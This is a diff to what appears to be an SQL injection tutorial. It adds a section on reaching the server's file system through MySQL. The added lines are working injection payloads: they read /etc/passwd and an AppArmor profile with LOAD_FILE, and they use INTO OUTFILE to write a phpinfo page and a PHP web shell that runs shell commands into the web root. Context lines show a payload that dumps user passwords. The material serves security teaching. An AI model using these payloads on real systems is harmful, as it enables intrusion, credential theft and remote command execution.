@@ -5,7 +5,7 @@
 • Basic SQL Injection Examples
 • SQL Injection using UNION
 • Using UNION to Retrieve Data from other Tables
-• 
+• SQLi: Interacting with the file system
 • 
 • 
 • 
@@ -162,62 +162,27 @@ Modify the SQL query to display the username and password values from the tikiwi
 0' or 0=0 UNION SELECT user, password from tikiwiki195.tiki_users #
 
 
+-- SQLi: Interacting with the file system --
 
+Under specific circumstances we can exploit SQL injection vulnerabilities to interact with the underlying file system on the target host. 
+MySQL has several functions that we can use to read and write files on the local file system. 
+In the following sections we will have a look at the LOAD_FILE function to read local files and the OUTFILE function to write files to the local file system, such as a web shell.
 
+➜ Reading local files with the LOAD_FILE function
 
+With the MySQL LOAD_FILE() function we can read files on the local file system.
 
+SELECT * LOAD_FILE('/home/username/mytextfile.txt');
+0' UNION SELECT 1, load_file('/etc/passwd') #
 
+➜ Writing files with the OUTFILE function
 
+With the OUTFILE function we can write the selected rows to a file on the local file system. 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+SELECT * [fields] INTO OUTFILE '/tmp/output.txt';
+0' UNION SELECT '<?php phpinfo();?>', null INTO OUTFILE '/var/www/info.php' #
+0' UNION SELECT '<?php echo shell_exec($_GET[\'cmd\']); ?>', null INTO OUTFILE '/var/www/cmd.php' #
+0' UNION SELECT 1, load_file('/etc/apparmor.d/usr.sbin.mysqld') #
 
 
 
